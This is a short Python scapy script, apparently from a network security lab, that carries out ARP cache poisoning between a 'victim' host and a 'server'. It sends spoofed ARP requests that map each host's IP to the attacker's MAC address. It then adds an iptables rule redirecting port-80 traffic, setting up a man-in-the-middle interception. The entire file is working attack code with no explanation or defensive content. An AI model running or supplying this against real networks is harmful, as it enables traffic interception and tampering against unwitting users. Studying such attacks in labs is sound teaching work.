#!/usr/bin/env python3
from scapy.all import *
from time import  *
import os

IP_VICTIM = "10.9.0.5"
MAC_VICTIM = "02:42:0a:09:00:05"

IP_SERVER = "10.9.0.6"
MAC_SERVER = "02:42:0a:09:00:06"

IP_ATTACKER = "10.9.0.105"
MAC_ATTACKER = "02:42:0a:09:00:69"

# Constructing spoofed ARP request to Victim
ether1 = Ether()
ether1.dst = MAC_VICTIM
arp1 = ARP()
arp1.psrc = IP_SERVER
arp1.hwsrc = MAC_ATTACKER
arp1.pdst  = IP_VICTIM
arp1.op = 1 
frame1 = ether1/arp1

# Constructing spoofed ARP request to Server
ether2 = Ether()
ether2.dst = MAC_SERVER
arp2 = ARP()
arp2.psrc = IP_VICTIM
arp2.hwsrc = MAC_ATTACKER
arp2.pdst  = IP_SERVER
arp2.op = 1 
frame2 = ether2/arp2

print("Sending spoofed ARP request to Victim & Server")
sendp(frame1)
sendp(frame2)

os.system("/sbin/iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-ports 80")
